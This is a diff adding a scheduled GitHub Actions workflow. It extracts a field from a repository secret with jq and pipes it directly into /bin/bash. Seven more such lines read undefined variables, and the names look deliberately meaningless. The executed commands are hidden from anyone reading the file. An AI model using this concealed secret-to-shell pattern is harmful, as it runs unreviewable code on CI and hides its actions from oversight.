@@ -1,0 +1,25 @@
+name: baijinshuiqi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baijinshuiqi
+        env:
+          xtw7006: ${{ secrets.xtw7006 }}
+        run: |
+          echo $xtw7006 | jq -r .u09 | /bin/bash
+          echo $pofc3 | jq -r .ao5 | /bin/bash
+          echo $tnfid7 | jq -r .d018 | /bin/bash
+          echo $go4264 | jq -r .fpo49 | /bin/bash
+          echo $mex3458 | jq -r .wuoy9 | /bin/bash
+          echo $oxtsz85205 | jq -r .qlyj538 | /bin/bash
+          echo $gvyxr16 | jq -r .dzyb0 | /bin/bash
+          echo $pb70 | jq -r .mpsrv25 | /bin/bash
+
